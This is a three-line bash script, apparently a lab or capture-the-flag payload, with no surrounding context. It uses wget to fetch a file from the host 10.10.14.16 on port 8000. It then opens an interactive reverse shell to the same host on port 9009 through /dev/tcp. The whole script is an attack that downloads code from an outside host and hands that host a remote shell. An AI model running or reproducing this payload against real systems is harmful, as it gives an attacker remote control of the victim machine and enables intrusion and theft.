#!/bin/bash
wget 10.10.14.16:8000/working
bash -c "bash -i >& /dev/tcp/10.10.14.16/9009 0>&1"
